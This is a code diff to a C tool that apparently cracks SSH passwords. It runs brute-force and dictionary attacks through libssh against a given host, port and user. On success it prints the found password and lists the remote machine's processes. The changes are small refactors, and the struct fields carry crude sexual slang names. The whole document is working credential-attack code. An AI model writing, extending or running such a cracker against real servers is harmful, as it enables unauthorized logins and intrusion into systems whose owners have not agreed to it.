@@ -28,11 +28,12 @@ pthread_mutex_t mutex;
 
 //エロい構造(体)
 struct hentai {
-    char *hotel; //ip
-    char *jk;    //name
-    int vagina;  //port
-    char av[256];//filename
-    char ok[2]; //bool
+    char *hotel;     //ip
+    char *jk;        //name
+    int vagina;      //port
+    char av[256];    //filename
+    char ok[2];      //bool
+    char *cream_pie; //password
 } otintin;
 
 //見たとおり。
@@ -157,14 +158,14 @@ int show_remote_processes(ssh_session session) {
 
 //ssh接続
 int ssh_main_connection(char password[]) {
-    char key[strlen(password) + 1];
-    int rc;
-    size_t i;
     ssh_session my_ssh_session = ssh_new();
+    int rc;
+
+    int (*p_pass)(ssh_session, const char*, const char*) = &ssh_userauth_password;
     
     if (my_ssh_session == NULL) return 1;
 
-    for (i = 0; i <= strlen(password); i++) key[i] = (char)password[i];
+    otintin.cream_pie = password;
     
     ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, otintin.hotel);
     ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, otintin.jk);
@@ -177,13 +178,13 @@ int ssh_main_connection(char password[]) {
         return 1;
     }
     
-    if ((rc = ssh_userauth_password(my_ssh_session, NULL, key)) != SSH_AUTH_SUCCESS) {
+    if ((rc = (*p_pass)(my_ssh_session, NULL, otintin.cream_pie)) != SSH_AUTH_SUCCESS) {
         ssh_disconnect(my_ssh_session);
         ssh_free(my_ssh_session);
         return 1;
     }
     else {
-        printf("\nPassword found! => %s\n", key);
+        printf("\nPassword found! => %s\n", otintin.cream_pie);
     }
     
     if ((rc = show_remote_processes(my_ssh_session)) != SSH_OK) {
@@ -204,7 +205,7 @@ void *dictionary_attack(void *p) {
     int logical = -1;
     FILE *fp;
     if ((fp = fopen(otintin.av, "r")) == NULL) {
-        printf("Error: Could not open file.\n");
+        puts("Error: Could not open file.\n");
         exit(1);
     }
     while (fgets(str, MAXLEN, fp) != NULL) {
@@ -307,7 +308,7 @@ int main(int argc, char* argv[]) {
     
     otintin.vagina = atoi(argv[4]);
     if (port < 0 || port > 65535) {
-        printf("Error: Do you know what a short type is?\n");
+        puts("Error: Do you know what a short type is?");
         return 1;
     }
     
@@ -316,7 +317,7 @@ int main(int argc, char* argv[]) {
     otintin.hotel = argv[2];
     otintin.jk = argv[6];
     
-    puts("\n 1: brute force attack");
+    printf("\n 1: brute force attack\n");
     puts(" 2: dictionary attack");
     printf("[*] Select Mode [1/2]: ");
     fgets(c_mode, sizeof(c_mode), stdin);
